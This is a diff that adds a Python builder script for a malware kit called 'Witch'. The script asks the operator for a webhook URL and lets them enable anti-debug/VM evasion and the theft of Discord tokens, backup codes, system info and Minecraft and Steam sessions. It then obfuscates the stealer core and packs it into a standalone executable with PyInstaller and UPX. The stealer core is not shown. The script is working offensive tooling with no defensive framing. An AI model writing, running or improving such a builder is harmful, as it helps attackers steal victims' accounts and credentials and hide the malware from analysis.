@@ -1,0 +1,129 @@
+import re
+import os
+import ast
+import random
+import zlib
+import base64
+import subprocess
+import colorama
+import sys
+from colorama import Fore
+import pyfiglet
+import datetime
+import requests
+import getpass
+import msvcrt
+from pystyle import Center
+from rich.console import Console
+from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn                                                                                                                                                                                                                                                                                                                                                                                          # Witch❤️
+from rich import print as rprint
+from datetime import *
+
+from utils.module.Obfuscators import Obfuscators # Restored because obfscator was not the problem
+
+os.system("cls")
+obf = Obfuscators(include_imports=True, recursion=5)
+
+version = "v1.31.3"
+CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam"]
+ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal"]
+PATH = "src/stealer_core/src.py"
+
+def timestamp():
+    now = datetime.now()
+    return f"{Fore.CYAN}[{now.hour}:{now.minute}:{now.second}]{Fore.RESET} "
+
+def log_debug(message):
+    username = getpass.getuser()
+    print(f"{timestamp()}{Fore.GREEN}DEBUG {Fore.LIGHTBLACK_EX}(User: {username}) {Fore.RESET}{message}")
+
+print(Fore.LIGHTMAGENTA_EX + Center.XCenter("""
+ __          ___ _       _     
+ \ \        / (_) |     | |    
+  \ \  /\  / / _| |_ ___| |__  
+   \ \/  \/ / | | __/ __| '_ \ 
+    \  /\  /  | | || (__| | | |
+     \/  \/   |_|\__\___|_| |_|
+"""))
+print (" ")
+username = getpass.getuser()
+log_debug(f"Witch Version | {version}")
+# print (timestamp() + f"{Fore.GREEN}DEBUG")
+
+
+def ask_toggle(key):
+    print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}?:{Fore.CYAN} ", end="", flush=True)
+    while True:
+        if msvcrt.kbhit():
+            ch = msvcrt.getch().decode("utf-8").lower()
+            if ch == "y":
+                print("\b\b Yes")
+                return True
+            elif ch == "n":
+                print("\b\b No")
+                return False
+            else:
+                print(f"\n{Fore.RED}Invalid Option. Retry please")
+                print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}? {Fore.RESET}Enable {key}:{Fore.CYAN} ", end="", flush=True)
+
+
+def ask_webhook():
+    while True:
+        val = input(f"{Fore.LIGHTMAGENTA_EX}?{Fore.RESET} Enter Your Webhook:{Fore.CYAN} ").strip()
+        if val.startswith("http://") or val.startswith("https://"):
+            return val
+        else:
+            log_debug(f"Invalid Webhook URL provided.")
+
+def update_config_in_file(filepath, updated_config, webhook_url=None):
+    try:
+        with open(filepath, "r", encoding="utf-8") as f:
+            content = f.read()
+    except Exception as e:
+        log_debug(f"Error reading file {filepath}: {e}")
+
+    try:
+        for key, value in updated_config.items():
+            content = re.sub(rf'"{key}":\s*(True|False)', f'"{key}": {value}', content)
+        if webhook_url:
+            content = re.sub(r'"webhook":\s*"[^"]*"', f'"webhook": \"{webhook_url}\"', content)
+        with open(filepath, "w", encoding="utf-8") as f:
+            f.write(content)
+        log_debug(f"Config Save Successfully.")
+    except Exception as e:
+        log_debug(f"Error updating config in {filepath}: {e}")
+        sys.exit(1)
+
+
+def build():
+    url = "https://pypi.org/pypi/pyinstaller/json"
+    response = requests.get(url)
+    if response.status_code == 200:
+        data = response.json()
+        latest_version = data["info"]["version"]
+        log_debug(f"Installing Latest Build Pyinstaller | {latest_version}")
+
+        os.system(f"pip install pyinstaller=={latest_version}")
+    else:
+        log_debug("Failed to fetch PyInstaller version from PyPI, installing default...")
+        os.system("pip install pyinstaller")
+    
+    os.system("pyinstaller --version")
+    os.system("pyinstaller --help")
+    print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Start Build Process")
+    os.system('pyinstaller --onefile --clean --name="main" --icon=src/ico.ico --upx-dir=src/upx src/stealer_core/src.py')
+    print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Build Finished.")
+    input("Press Enter key to exit.")
+    sys.exit(0)
+
+def main():
+    config = {}
+    webhook = ask_webhook()
+    for key, label in zip(CONFIG_KEYS, ENABLE_KEYS):
+        config[key] = ask_toggle(label)
+    update_config_in_file(PATH, config, webhook)
+    obf.execute(PATH)
+    build()
+
+if __name__ == "__main__":
+    main()
